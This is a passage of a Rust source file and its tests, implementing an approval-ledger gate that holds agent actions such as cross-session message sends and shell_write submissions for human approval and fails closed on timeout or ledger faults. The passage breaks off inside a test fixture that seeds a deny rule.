//! The approval-ledger gate — shared by `kj` verbs with external effects
//! ([`crate::kj::cc`]) and the `shell_write` gate ([`crate::kj::shell_gate`]).
//!
//! First consumer: `kj cc send` — injecting a turn into a Claude Code
//! session is exactly the "agent action a human should authorize" case the
//! ledger exists for (Amy, 2026-08-16: *"yeah kj cc send should go through
//! the ledger"*). The shape here is the template gate slice 1a
//! (`docs/issues.md`) extended, then, to `shell_write`
//! (`docs/gate-and-shell-split.md`, "Slice 4").
//!
//! A [`GateSpec`] carries an ORDERED list of [`GatedStatement`]s, not one —
//! `kj cc send` happens to gate exactly one, `shell_write` gates every
//! top-level statement a submission's `plan_program()` produces.
//! [`AskCoverage::verdict`] (`approval-ledger`) composes across the whole
//! list: a single denied statement denies the entire call, every statement
//! must be covered to auto-allow, anything else escalates — a
//! partially-covered submission is never partially applied, because there is
//! no way to run "just the allowed half" of one submitted blob (see
//! `docs/gate-and-shell-split.md`, "The crux").
//!
//! ## The flow
//!
//! 1. **Rules first** — [`approval_ledger::rules::redeem`] checks whether an
//!    active rule already covers the statement. A `Deny` rule denies without
//!    asking anyone; an `Allow` rule auto-allows; both still leave a durable
//!    ask row (created, then decided with `auto_reason`) so the audit trail
//!    is complete. With the free-variable statement this gate builds, allow
//!    rules cannot exist (ledger guarantee 3), so in practice everything
//!    escalates — deliberately, until fan-out exists.
//! 2. **Durable before asked** — [`approval_ledger::ask::create_ask`]
//!    commits before anything waits (ledger guarantee 1). The ask row is the
//!    durable record regardless of how the wait ends.
//! 3. **The wait** — poll the row until it goes terminal (somebody answered
//!    via `kj ledger`) or `gate_wait_timeout` elapses. Elapse calls
//!    [`approval_ledger::decide::expire`] and refuses: **fail-closed, loud,
//!    with the request id in the error** so a human can inspect what was
//!    asked.
//!
//! ## Two findings from the gate research pass, honored here
//!
//! - **The patient hold and this deadline share ONE number**
//!   (`TimeoutPolicy::gate_wait_timeout`): `kj_builtin` freezes the script
//!   clock around gated verbs for exactly this budget, so kaish's own
//!   watchdog cannot kill the wait before the gate's deadline fires
//!   (finding #1).
//! - **`authorized_label` is the RAW typed reference** (finding #3) — what
//!   the caller typed, never a resolved id/label. For `kj cc send` that is
//!   the target string exactly as given.
//!
//! ## Answering
//!
//! From any shell: `kj ledger list`, `kj ledger allow <id>` /
//! `kj ledger deny <id>` (see [`crate::kj::ledger`]). The ledger's claim
//! race (guarantee 5) makes concurrent answers safe: exactly one answerer
//! wins, losers read a loud `AlreadyDecided`/claim failure, never a silent
//! no-op.

use std::sync::Arc;
use std::time::{Duration, Instant};

use approval_ledger::types::{
    ApprovalStatus, AskCoverage, AskVerdict, NewAsk, NewOption, NewPlanCommand, NewPlanStatement,
    NewPlanVar, NewPlannedValue, Origin, StatementVerdict, VarBinding,
};

use crate::flows::SharedLedgerFlowBus;
use crate::kernel_db::KernelDb;
use crate::kj::KjCaller;

/// How a gate wait ended — a decision, or the absence of one.
///
/// The three-way split exists because "the gate said no" and "the gate
/// could not do its job" are different facts, and collapsing them is its
/// own failure family: a fault that reads as a policy decision teaches a
/// caller the wrong lesson (*that action is refused*) about a control that
/// was simply absent. The `shell_write` caller renders both as one error so
/// it never noticed, but the hook path must map them to `McpError::Denied`
/// and `McpError::GateUnavailable` respectively.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum GateVerdict {
    /// A human or a rule decided yes.
    Allowed,
    /// A human or a rule decided no. A real verdict.
    Denied,
    /// No decision was reached: the ledger could not be read or written, the
    /// ask row went missing, or nobody answered before the budget elapsed.
    /// Still fail-closed — the call does not proceed — but it is not a
    /// verdict, and must never be reported as one.
    Unavailable,
}

/// The durable ask an outcome belongs to. Present whenever the gate got far
/// enough to commit a row; absent only on the two faults that happen BEFORE
/// anything durable exists (the rule read failed, or `create_ask` failed).
///
/// A pair rather than two `Option` fields because the id and the status are
/// the same fact — a row either exists with both, or does not exist at all,
/// and two independent `Option`s could express a third state that cannot
/// happen.
#[derive(Debug, Clone)]
pub(crate) struct AskRef {
    pub request_id: String,
    pub status: ApprovalStatus,
}

/// How a gate wait ended.
#[derive(Debug, Clone)]
pub(crate) struct GateOutcome {
    pub verdict: GateVerdict,
    /// The ledger row this outcome belongs to, when there is one. `None`
    /// means the gate failed before recording anything: there is no id to
    /// show a human and nothing for `kj ledger` to find, and saying so
    /// beats printing an empty string where an id belongs.
    pub ask: Option<AskRef>,
    /// Human-readable reason, always populated — on refusal it says exactly
    /// why (denied by whom, expired after how long, which rule fired).
    pub reason: String,
}

impl GateOutcome {
    /// Whether the gated action may proceed. The only question callers that
    /// do not distinguish a fault from a refusal need to ask.
    pub fn allowed(&self) -> bool {
        matches!(self.verdict, GateVerdict::Allowed)
    }

    /// `"<id> (<status>)"`, or a plain statement that nothing was recorded.
    /// Callers put this in the message a model reads, so it must never
    /// render a blank where an ask id is expected.
    pub fn ask_description(&self) -> String {
        match &self.ask {
            Some(a) => format!("ask {} ({})", a.request_id, a.status),
            None => "no ask was recorded".to_string(),
        }
    }

    /// A fault before anything durable existed.
    fn unavailable_without_row(reason: String) -> Self {
        Self { verdict: GateVerdict::Unavailable, ask: None, reason }
    }
}

/// One statement inside a [`GateSpec`] — a ledger statement in waiting.
///
/// `rendered` is the statement text (with `${VAR}` placeholders for a
/// synthetic `kj`-verb statement, or the real kaish source for a
/// `shell_write` statement); `vars` names each variable the statement reads
/// or binds. The ledger refuses to learn ALLOW rules for a statement with
/// any free variable (guarantee 3) — which is precisely why
/// [`crate::kj::cc`] marks its message body free: every send stays
/// human-approved until the policy changes deliberately.
#[derive(Debug)]
pub(crate) struct GatedStatement {
    pub rendered: String,
    /// The statement's kind (`"kj_verb"` for a synthetic verb statement;
    /// kaish's own `Plan::statement_kind` — `"command"`, `"pipeline"`,
    /// `"for"`, … — for a `shell_write` statement).
    pub statement_kind: String,
    pub vars: Vec<(String, VarBinding)>,
    /// The statement's position in the ORIGINAL kaish source, when this
    /// statement came from `plan_program()` — `PlannedStatement::index`,
    /// counted BEFORE empty statements (a blank line, a comment) are
    /// dropped. `None` for a synthetic `kj`-verb statement, which has no
    /// source program to be a position in.
    ///
    /// Carried through so a refusal can name which statement in the
    /// caller's ORIGINAL submission is blamed. This must never be
    /// re-derived by enumerating `GateSpec::statements` itself — that Vec
    /// is already post-filter, so re-deriving a position from it reproduces
    /// exactly the gap kaish's own `plan_program` doc warns about (a leading
    /// comment or blank line shifts every index after it). Carry the
    /// PUBLISHED index, never recompute one.
    pub source_index: Option<usize>,
}

/// One gated action: an ordered list of [`GatedStatement`]s sharing one
/// `authorized_label` and answered as a single ask (see module docs — the
/// crux is that a submission can only be gated as a whole).
#[derive(Debug)]
pub(crate) struct GateSpec {
    pub origin: Origin,
    /// Ledger `instance` column, e.g. `"builtin.kj"` or `"builtin.shell_write"`.
    ///
    /// Owned rather than `&'static str` because a hook ask names whatever
    /// instance the hooked call was headed for, which is only known at fire
    /// time. The two static callers pay one allocation per gate, at human
    /// answer rates.
    pub instance: String,
    /// Ledger `tool` column, e.g. `"cc.send"` or `"shell_write"`.
    pub tool: String,
    /// The `HookEntry` id, when this ask came from a hook's `Ask` action.
    /// `None` for a gate a `kj` verb or the shell tool opened on itself.
    pub hook_id: Option<String>,
    /// Human-readable summary shown to whoever answers.
    pub description: String,
    /// The RAW typed reference (research-pass finding #3) — never a resolved
    /// label or id. For `shell_write`, the submitted source text itself:
    /// there is no separate "target" to resolve, so what the caller typed
    /// IS the whole statement.
    pub authorized_label: String,
    pub statements: Vec<GatedStatement>,
}

/// Poll interval for the wait loop. Sub-second keeps `kj ledger` answers
/// feeling instant without hammering the (sub-ms, mutex-guarded) DB read.
const POLL_INTERVAL: Duration = Duration::from_millis(250);

/// Statement digest: the ledger keys statements by an opaque
/// content-address string (`approval_statements.statement_digest`), so the
/// requirement is uniqueness per distinct statement, not a specific hash.
/// A namespaced, labeled digest of the rendered text gives exactly that,
/// stays stable across kernels, and reads for free in a `sqlite3` session —
/// no new crypto dependency for one gate.
///
/// Namespaced by [`Origin`] so a `kj cc send` statement and a `shell_write`
/// statement that happen to render identical text (e.g. both spell `rm x`)
/// never share a digest — a rule taught for one origin must never silently
/// redeem an ask from the other. `KjVerb`'s prefix (`"kj-verb"`, hyphenated)
/// is unchanged from before this gate went multi-origin, so any rule
/// already taught for `kj cc send` keeps matching.
fn statement_digest(origin: Origin, rendered: &str) -> String {
    match origin {
        Origin::KjVerb => format!("kj-verb:v1:{rendered}"),
        Origin::ShellGate => format!("shell-stmt:v1:{rendered}"),
        Origin::Hook => format!("hook:v1:{rendered}"),
    }
}

fn caller_context_bytes(caller: &KjCaller) -> Vec<u8> {
    caller
        .context_id
        .map(|c| c.as_bytes().to_vec())
        .unwrap_or_default()
}

fn build_ask(caller: &KjCaller, spec: &GateSpec) -> NewAsk {
    NewAsk {
        context_id: caller_context_bytes(caller),
        principal_id: caller.principal_id.as_bytes().to_vec(),
        origin: spec.origin,
        instance: Some(spec.instance.clone()),
        tool: Some(spec.tool.clone()),
        hook_id: spec.hook_id.clone(),
        description: spec.description.clone(),
        statements: spec
            .statements
            .iter()
            .map(|s| NewPlanStatement {
                statement_digest: statement_digest(spec.origin, &s.rendered),
                rendered: s.rendered.clone(),
                statement_kind: s.statement_kind.clone(),
                // A synthetic single command wrapping the whole rendered
                // text — NOT kaish's real per-command/per-arg structure.
                // `rendered` (shown verbatim by `kj ledger show`) is the
                // full-fidelity surface a human reads; this satisfies the
                // schema's NOT NULL `approval_plan_commands` row without
                // claiming a command-level breakdown this gate doesn't
                // build. Threading kaish's real `PlannedCommand` tree
                // through here is future work, not required for Slice 4.
                commands: vec![NewPlanCommand {
                    name: spec.tool.clone(),
                    args: vec![NewPlannedValue::Plain(s.rendered.clone())],
                    redirects: vec![],
                    backgrounded: false,
                }],
                vars: s
                    .vars
                    .iter()
                    .map(|(name, binding)| NewPlanVar {
                        name: name.clone(),
                        binding: *binding,
                    })
                    .collect(),
            })
            .collect(),
        authorized_label: Some(spec.authorized_label.clone()),
        rc_run_id: None,
        expires_at: None,
        options: vec![
            NewOption {
                option_id: "allow_once".into(),
                label: "Allow once".into(),
                kind: "allow_once".into(),
            },
            NewOption {
                option_id: "deny".into(),
                label: "Deny".into(),
                kind: "deny".into(),
            },
        ],
        signals: vec![],
    }
}

/// Truncate a statement's rendered text for a one-line reason string — the
/// full text is always available via `kj ledger show <id>`.
fn truncate_for_reason(s: &str) -> String {
    const LIMIT: usize = 120;
    if s.chars().count() <= LIMIT {
        return s.replace('\n', "⏎");
    }
    let head: String = s.chars().take(LIMIT).collect();
    format!("{}…", head.replace('\n', "⏎"))
}

/// Describe a rule-composed verdict for the human/model-facing reason
/// string, naming exactly which statement(s) an active DENY rule matched —
/// using the SOURCE index the caller published for each statement
/// (`GatedStatement::source_index`), never a position re-derived by
/// enumerating `statements` (see that field's doc for why the two can
/// disagree).
fn describe_rule_coverage(statements: &[GatedStatement], coverage: &AskCoverage, allow: bool) -> String {
    if allow {
        return "rule coverage: every statement matched an active allow rule".to_string();
    }
    let offenders: Vec<String> = coverage
        .per_statement
        .iter()
        .zip(statements.iter())
        .filter(|(v, _)| matches!(v, StatementVerdict::Deny(_)))
        .map(|(_, s)| match s.source_index {
            Some(idx) => format!("statement #{idx} (`{}`)", truncate_for_reason(&s.rendered)),
            None => format!("`{}`", truncate_for_reason(&s.rendered)),
        })
        .collect();
    format!(
        "rule coverage: a statement matched an active deny rule — {}",
        offenders.join(", ")
    )
}

/// Announce that the approval ledger moved, to anyone subscribed.
///
/// **Call this only AFTER the mutation has committed** — commands express
/// intent, events express accepted facts, and we never publish one we have
/// not durably accepted (CLAUDE.md, "Durable state and the wire"). Reading
/// the generation back out of the ledger rather than taking one from the
/// caller is what enforces that here: the number published is by
/// construction one SQLite has already assigned inside the committed
/// transaction, so there is no way to announce a generation belonging to a
/// transaction that later rolled back.
///
/// Deliberately infallible from the caller's view. A lost notification costs
/// a subscriber a late poll and nothing else — the ledger, not this message,
/// is the authority, and every answer still goes through `claim`/`decide`.
/// Failing an approval that was decided correctly, because we could not
/// *gossip* about it, would be much the worse outcome, so a read failure is
/// logged and swallowed. This is a hint channel; it is not in the decision
/// path and must never become one.
pub(crate) fn announce_ledger_change(
    db: &Arc<parking_lot::Mutex<KernelDb>>,
    bus: &SharedLedgerFlowBus,
) {
    let generation = {
        let db = db.lock();
        match approval_ledger::generation::current(db.conn_for_ledger()) {
            Ok(g) => g,
            Err(e) => {
                tracing::warn!(
                    "approval-ledger generation unreadable, skipping the change \
                     notification (subscribers find out on their next poll): {e}"
                );
                return;
            }
        }
    };
    bus.publish(crate::flows::LedgerFlow::Changed { generation });
}

/// Run the gate: rules → durable ask → wait for a decision or expire.
///
/// `wait` must be the SAME `gate_wait_timeout` the caller's patient hold is
/// using (module docs) — the dispatcher passes
/// `kernel.timeouts().gate_wait_timeout` for both.
///
/// `ledger_flows` receives a fire-and-forget notification after each durable
/// ledger transition here. The one that matters most is the **escalation**
/// announcement, published after `create_ask` commits and *before* the wait
/// begins: a notification sent after `run_gate` returns would reach clients
/// only once the answer is no longer needed, which is precisely the silent
/// hang this exists to end.
pub(crate) async fn run_gate(
    db: &Arc<parking_lot::Mutex<KernelDb>>,
    caller: &KjCaller,
    spec: GateSpec,
    wait: Duration,
    ledger_flows: &SharedLedgerFlowBus,
) -> GateOutcome {
    let context = caller_context_bytes(caller);
    let principal = caller.principal_id.as_bytes().to_vec();
    let digests: Vec<String> = spec
        .statements
        .iter()
        .map(|s| statement_digest(spec.origin, &s.rendered))
        .collect();
    let digest_refs: Vec<&str> = digests.iter().map(String::as_str).collect();

    // 1. Rules first — an explicit DENY rule on ANY statement short-circuits
    //    the WHOLE submission without asking anyone (deny wins); every
    //    statement covered by an ALLOW rule auto-allows the whole
    //    submission; anything else (including partial coverage) escalates —
    //    `AskCoverage::verdict()` composes this, never applying a submission
    //    partially (module docs: there is no way to run "just the allowed
    //    half" of one submitted blob). Both terminal outcomes leave a
    //    durable row.
    let coverage = {
        let db = db.lock();
        match approval_ledger::rules::redeem(
            db.conn_for_ledger(),
            &digest_refs,
            &spec.authorized_label,
            Some(context.as_slice()),
            Some(principal.as_slice()),
        ) {
            Ok(coverage) => coverage,
            Err(e) => {
                return GateOutcome::unavailable_without_row(format!(
                    "approval gate could not read its rules: {e} (fail-closed — this is a \
                     ledger fault, not a decision)"
                ));
            }
        }
    };
    let verdict = coverage.verdict();

    let ask = build_ask(caller, &spec);

    // 2. Durable before asked — the row exists before any waiting starts.
    let request_id = {
        let db = db.lock();
        match approval_ledger::ask::create_ask(db.conn_for_ledger(), &ask) {
            Ok(id) => id,
            Err(e) => {
                return GateOutcome::unavailable_without_row(format!(
                    "approval gate could not record the ask: {e} (fail-closed — this is a \
                     ledger fault, not a decision)"
                ));
            }
        }
    };

    // An auto decision still gets its durable row, decided immediately with
    // no human in the loop (`decided_by` None + `auto_reason` mark it).
    if matches!(verdict, AskVerdict::Allow | AskVerdict::Deny) {
        let allow = matches!(verdict, AskVerdict::Allow);
        let auto_reason = describe_rule_coverage(&spec.statements, &coverage, allow);
        let auto_reason = auto_reason.as_str();
        let row = {
            let db = db.lock();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow,
                    decided_by: None,
                    decided_option: None,
                    remember_scope: None,
                    auto_reason: Some(auto_reason),
                },
            )
        };
        // Both the ask row and its auto-decision have committed by now.
        announce_ledger_change(db, ledger_flows);
        return match row {
            Ok(row) => GateOutcome {
                verdict: if row.status.is_allowed() {
                    GateVerdict::Allowed
                } else {
                    GateVerdict::Denied
                },
                ask: Some(AskRef { request_id, status: row.status }),
                reason: auto_reason.to_string(),
            },
            // The ask committed and its decision did not, so the row exists
            // and is still pending — a fault, and one that leaves something
            // `kj ledger` can still be pointed at.
            Err(e) => GateOutcome {
                verdict: GateVerdict::Unavailable,
                ask: Some(AskRef { request_id, status: ApprovalStatus::Pending }),
                reason: format!(
                    "approval gate could not record the rule decision: {e} (fail-closed — \
                     this is a ledger fault, not a decision)"
                ),
            },
        };
    }

    // 3. Escalate: wait for a human answer (`kj ledger`) until terminal or
    //    the shared budget elapses.
    //
    // Announce BEFORE the wait, not after it. This is the notification the
    // whole slice exists for: until it existed, an escalated ask was a row in
    // a SQLite table that nothing pointed at, so a model calling
    // `shell_write` blocked here for the full budget while no human had any
    // way to learn an answer was wanted — the ask was answerable and
    // undiscoverable at the same time. Publishing after the loop would
    // reproduce that exactly, telling everyone once it no longer matters.
    announce_ledger_change(db, ledger_flows);
    let deadline = Instant::now() + wait;
    loop {
        {
            let db = db.lock();
            match approval_ledger::ask::get_approval(db.conn_for_ledger(), &request_id) {
                Ok(Some(row)) if row.status.is_terminal() => {
                    let allowed = row.status.is_allowed();
                    let reason = if allowed {
                        format!(
                            "approved via {:?} by principal {}",
                            row.decided_option,
                            row.decided_by
                                .map(|b| b
                                    .iter()
                                    .map(|x| format!("{x:02x}"))
                                    .collect::<String>())
                                .unwrap_or_else(|| "auto".into())
                        )
                    } else {
                        format!(
                            "refused: ask {request_id} ended `{}` — answer it with `kj ledger \
                             allow {request_id}` before the gate expires next time",
                            row.status
                        )
                    };
                    return GateOutcome {
                        verdict: if allowed {
                            GateVerdict::Allowed
                        } else {
                            GateVerdict::Denied
                        },
                        ask: Some(AskRef { request_id, status: row.status }),
                        reason,
                    };
                }
                Ok(_) => {} // still pending/claimed — keep waiting
                Err(e) => {
                    return GateOutcome {
                        verdict: GateVerdict::Unavailable,
                        ask: Some(AskRef { request_id, status: ApprovalStatus::Pending }),
                        reason: format!(
                            "approval gate lost track of its ask row: {e} (fail-closed — \
                             this is a ledger fault, not a decision)"
                        ),
                    };
                }
            }
        }
        if Instant::now() >= deadline {
            let row = {
                let db = db.lock();
                approval_ledger::decide::expire(db.conn_for_ledger(), &request_id)
            };
            let status = row.as_ref().map(|r| r.status).unwrap_or(ApprovalStatus::Expired);
            // The expiry is itself a durable ledger transition — a client
            // showing this ask as pending needs to stop showing it.
            announce_ledger_change(db, ledger_flows);
            let reason = format!(
                "no human answered ask {request_id} within {}s — expired, fail-closed \
                 (answer faster next time, or raise gate_wait_timeout)",
                wait.as_secs()
            );
            // Nobody decided. Fail-closed, but an unanswered ask is the
            // absence of a decision, not a refusal — a caller told "denied"
            // here would learn that the action is disallowed, when the truth
            // is that no one was around to say.
            return GateOutcome {
                verdict: GateVerdict::Unavailable,
                ask: Some(AskRef { request_id, status }),
                reason,
            };
        }
        tokio::time::sleep(POLL_INTERVAL).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::kj::test_helpers::{test_caller, test_dispatcher_with_timeouts};
    use kaijutsu_types::TimeoutPolicy;

    fn cc_spec(target: &str) -> GateSpec {
        GateSpec {
            origin: Origin::KjVerb,
            instance: "builtin.kj".into(),
            tool: "cc.send".into(),
            hook_id: None,
            description: format!("send a cross-session message to CC session {target:?}"),
            authorized_label: target.to_string(),
            statements: vec![GatedStatement {
                rendered: "kj cc send ${TARGET} ${MESSAGE}".into(),
                statement_kind: "kj_verb".into(),
                vars: vec![
                    ("TARGET".into(), VarBinding::Bound),
                    ("MESSAGE".into(), VarBinding::Free),
                ],
                source_index: None,
            }],
        }
    }

    /// A spec with TWO statements — the `shell_write` shape, exercised here
    /// without depending on `crate::kj::shell_gate` so this module's tests
    /// stay a pure test of `run_gate`'s composition, not of the planner.
    fn two_statement_spec(label: &str, first: &str, second: &str, second_index: usize) -> GateSpec {
        GateSpec {
            origin: Origin::ShellGate,
            instance: "builtin.shell_write".into(),
            tool: "shell_write".into(),
            hook_id: None,
            description: format!("shell_write: {first:?}; {second:?}"),
            authorized_label: label.to_string(),
            statements: vec![
                GatedStatement {
                    rendered: first.to_string(),
                    statement_kind: "command".into(),
                    vars: vec![],
                    source_index: Some(second_index - 1),
                },
                GatedStatement {
                    rendered: second.to_string(),
                    statement_kind: "command".into(),
                    vars: vec![],
                    source_index: Some(second_index),
                },
            ],
        }
    }

    async fn short_gate_dispatcher() -> crate::kj::KjDispatcher {
        let policy = TimeoutPolicy {
            gate_wait_timeout: Duration::from_millis(400),
            ..TimeoutPolicy::default()
        };
        test_dispatcher_with_timeouts(policy).await
    }

    #[tokio::test]
    async fn an_unanswered_gate_expires_fail_closed_and_leaves_a_durable_row() {
        let d = short_gate_dispatcher().await;
        let caller = test_caller();
        let start = Instant::now();
        let outcome = run_gate(
            &d.kernel_db.clone(),
            &caller,
            cc_spec("kaijutsu-chan"),
            Duration::from_millis(400),
            d.kernel.ledger_flows(),
        )
        .await;

        assert!(!outcome.allowed(), "an unanswered gate must refuse");
        // Nobody answered, so nobody decided: unavailable, NOT denied.
        assert_eq!(outcome.verdict, GateVerdict::Unavailable);
        let ask = outcome.ask.as_ref().expect("an expired ask still has a row");
        assert_eq!(ask.status, ApprovalStatus::Expired);
        assert!(outcome.reason.contains("no human answered"));
        assert!(start.elapsed() >= Duration::from_millis(400));
        assert!(!ask.request_id.is_empty());

        // Guarantee 1, verified from the outside: the row is on disk,
        // terminal, and carries the RAW typed label (finding #3), not a
        // resolved one.
        let db = d.kernel_db.clone();
        let db = db.lock();
        let row = approval_ledger::ask::get_approval(db.conn_for_ledger(), &ask.request_id)
            .unwrap()
            .expect("the ask row must exist after the gate");
        assert_eq!(row.status, ApprovalStatus::Expired);
        assert_eq!(row.authorized_label.as_deref(), Some("kaijutsu-chan"));
        assert_eq!(row.origin, Origin::KjVerb);
    }

    #[tokio::test]
    async fn an_answer_from_another_principal_is_honored() {
        let d = short_gate_dispatcher().await;
        let db = d.kernel_db.clone();
        let caller = test_caller();

        // Fire the gate in the background with a generous budget...
        let gate_db = db.clone();
        let gate_flows = d.kernel.ledger_flows().clone();
        let gate = tokio::spawn(async move {
            run_gate(
                &gate_db,
                &caller,
                cc_spec("kaijutsu-chan"),
                Duration::from_secs(10),
                &gate_flows,
            )
            .await
        });

        // ...then answer it from a DIFFERENT principal, the way a human in
        // another shell would (`kj ledger allow`).
        let mut request_id = String::new();
        for _ in 0..40 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let db = db.lock();
            let pending = approval_ledger::ask::list_pending(db.conn_for_ledger()).unwrap();
            if let Some(row) = pending.first() {
                request_id = row.request_id.clone();
                break;
            }
        }
        assert!(!request_id.is_empty(), "the gate must leave a pending ask");

        let answerer = kaijutsu_types::PrincipalId::new();
        {
            let db = db.lock();
            approval_ledger::claim::claim(db.conn_for_ledger(), &request_id, answerer.as_bytes()).unwrap();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow: true,
                    decided_by: Some(answerer.as_bytes()),
                    decided_option: Some("allow_once"),
                    remember_scope: None,
                    auto_reason: None,
                },
            )
            .unwrap();
        }

        let outcome = gate.await.unwrap();
        assert!(outcome.allowed(), "an allow answer must open the gate");
        assert_eq!(outcome.verdict, GateVerdict::Allowed);
        let ask = outcome.ask.expect("an answered ask has a row");
        assert_eq!(ask.status, ApprovalStatus::Allowed);
        assert_eq!(ask.request_id, request_id);
    }

    /// The point of the whole notification slice: an escalated ask is
    /// announced WHILE it is still answerable, not after the wait ends.
    ///
    /// Before this existed, an escalated ask was a row in a SQLite table
    /// nothing pointed at — answerable and undiscoverable at once — so a
    /// `shell_write` call blocked for its entire budget while no human had
    /// any way to learn an answer was wanted. This test fails if the
    /// announcement is ever moved after the wait loop, which would restore
    /// exactly that behaviour while every other test still passed.
    #[tokio::test]
    async fn an_escalated_ask_is_announced_before_the_wait_not_after() {
        let d = short_gate_dispatcher().await;
        let db = d.kernel_db.clone();
        let caller = test_caller();

        // Subscribe BEFORE the gate runs, or the notification races us.
        let mut sub = d.kernel.ledger_flows().subscribe("ledger.>");

        let gate_db = db.clone();
        let gate_flows = d.kernel.ledger_flows().clone();
        // A budget far longer than this test is willing to wait: if the
        // announcement only arrived at the end, we would time out below
        // rather than pass slowly.
        let gate = tokio::spawn(async move {
            run_gate(
                &gate_db,
                &caller,
                cc_spec("kaijutsu-chan"),
                Duration::from_secs(600),
                &gate_flows,
            )
            .await
        });

        let mut announced = None;
        for _ in 0..40 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            if let Some(msg) = sub.try_recv() {
                announced = Some(msg.payload);
                break;
            }
        }
        let announced = announced.expect(
            "an escalated ask must be announced while it is still pending — \
             nothing arrived while the gate was waiting",
        );
        assert!(
            announced.generation() > 0,
            "the announced generation must be the committed one, got {}",
            announced.generation()
        );

        // The gate is still waiting, which is what makes the above meaningful.
        assert!(!gate.is_finished(), "the gate must still be waiting when the ask is announced");

        // And the answer produces its own announcement, so a client showing
        // this ask as pending learns to stop.
        let mut request_id = String::new();
        {
            let db = db.lock();
            let pending = approval_ledger::ask::list_pending(db.conn_for_ledger()).unwrap();
            request_id = pending.first().map(|r| r.request_id.clone()).unwrap_or(request_id);
        }
        assert!(!request_id.is_empty(), "the gate must leave a pending ask");

        let answerer = kaijutsu_types::PrincipalId::new();
        {
            let db = db.lock();
            approval_ledger::claim::claim(db.conn_for_ledger(), &request_id, answerer.as_bytes())
                .unwrap();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow: true,
                    decided_by: Some(answerer.as_bytes()),
                    decided_option: Some("allow_once"),
                    remember_scope: None,
                    auto_reason: None,
                },
            )
            .unwrap();
        }

        let outcome = gate.await.unwrap();
        assert!(outcome.allowed(), "an allow answer must open the gate");
    }

    #[tokio::test]
    async fn a_deny_answer_refuses_loudly() {
        let d = short_gate_dispatcher().await;
        let db = d.kernel_db.clone();
        let caller = test_caller();

        let gate_db = db.clone();
        let gate_flows = d.kernel.ledger_flows().clone();
        let gate = tokio::spawn(async move {
            run_gate(
                &gate_db,
                &caller,
                cc_spec("fleet-lead"),
                Duration::from_secs(10),
                &gate_flows,
            )
            .await
        });

        let mut request_id = String::new();
        for _ in 0..40 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let db = db.lock();
            if let Some(row) = approval_ledger::ask::list_pending(db.conn_for_ledger()).unwrap().first() {
                request_id = row.request_id.clone();
                break;
            }
        }
        assert!(!request_id.is_empty());
        {
            let db = db.lock();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow: false,
                    decided_by: Some(&[7, 7, 7]),
                    decided_option: Some("deny"),
                    remember_scope: None,
                    auto_reason: None,
                },
            )
            .unwrap();
        }

        let outcome = gate.await.unwrap();
        assert!(!outcome.allowed());
        assert_eq!(outcome.verdict, GateVerdict::Denied);
        assert_eq!(outcome.ask.as_ref().unwrap().status, ApprovalStatus::Denied);
        assert!(outcome.reason.contains("refused"));
    }

    #[tokio::test]
    async fn the_ask_message_body_is_free_so_allow_rules_cannot_learn_it() {
        // Guarantee 3, end to end: after a human allows once, the ledger
        // must NOT create an ALLOW rule — the MESSAGE variable is free, and
        // an actor that could auto-approve arbitrary message content to a
        // target is exactly what this gate exists to prevent.
        let d = short_gate_dispatcher().await;
        let db = d.kernel_db.clone();
        let caller = test_caller();

        let gate_db = db.clone();
        let gate_flows = d.kernel.ledger_flows().clone();
        let gate = tokio::spawn(async move {
            run_gate(
                &gate_db,
                &caller,
                cc_spec("kaijutsu-chan"),
                Duration::from_secs(10),
                &gate_flows,
            )
            .await
        });

        let mut request_id = String::new();
        for _ in 0..40 {
            tokio::time::sleep(Duration::from_millis(50)).await;
            let db = db.lock();
            if let Some(row) = approval_ledger::ask::list_pending(db.conn_for_ledger()).unwrap().first() {
                request_id = row.request_id.clone();
                break;
            }
        }
        let answerer = kaijutsu_types::PrincipalId::new();
        {
            let db = db.lock();
            approval_ledger::claim::claim(db.conn_for_ledger(), &request_id, answerer.as_bytes()).unwrap();
            approval_ledger::decide::decide(
                db.conn_for_ledger(),
                &request_id,
                approval_ledger::decide::DecideInput {
                    allow: true,
                    decided_by: Some(answerer.as_bytes()),
                    decided_option: Some("allow_once"),
                    remember_scope: Some("always"),
                    auto_reason: None,
                },
            )
            .unwrap();
            // Even an explicit "remember always" answer must not produce an
            // allow rule while a free variable is in the statement
            // (ledger guarantee 3).
            let learned = approval_ledger::rules::learn_from_approval(
                db.conn_for_ledger(),
                &request_id,
                0,
                approval_ledger::types::RuleScope::Always,
                true,
                Some(answerer.as_bytes()),
            );
            assert!(
                learned.is_err(),
                "no ALLOW rule may be learned from a statement with a free variable: {learned:?}"
            );
        }
        assert!(gate.await.unwrap().allowed());
    }

    /// Seed a standing DENY rule for exactly `(digest, label)`, scope
    /// `Always` (so session context/principal never matter for the match).
    /// Goes through the real `create_ask` → `decide` → `learn_from_approval`
    /// path rather than inserting a row directly, so the fixture exercises
    /// the same guarantees a human's "remember this" answer would.
    fn seed_deny_rule(db: &Arc<parking_lot::Mutex<KernelDb>>, digest: &str, label: &str) {
        let seed = approval_ledger::types::NewAsk {
            context_id: vec![],
            principal_id: vec![],
            origin: Origin::ShellGate,
            instance: Some("builtin.shell_write".into()),
            tool: Some("shell_write".into()),
            hook_id: None,
            description: "test fixture: seed a deny rule".into(),
            statements: vec![approval_ledger::types::NewPlanStatement {
                statement_digest: digest.to_string(),
                rendered: "(fixture statement)".into(),
                statement_kind: "command".into(),
                commands: vec![NewPlanCommand {
                    name: "seed".into(),
                    args: vec![],
                    redirects: vec![],
                    backgrounded: false,
                }],
                vars: vec![],
            }],
            authorized_label: Some(label.to_string()),
            rc_run_id: None,
            expires_at: None,
            options: vec![],
            signals: vec![],
        };
        let db = db.lock();
        let conn = db.conn_for_ledger();
        let request_id = approval_ledger::ask::create_ask(conn, &seed).unwrap();
        approval_ledger::decide::decide(
            conn,
            &request_id,
            approval_ledger::decide::DecideInput {
                allow: false,
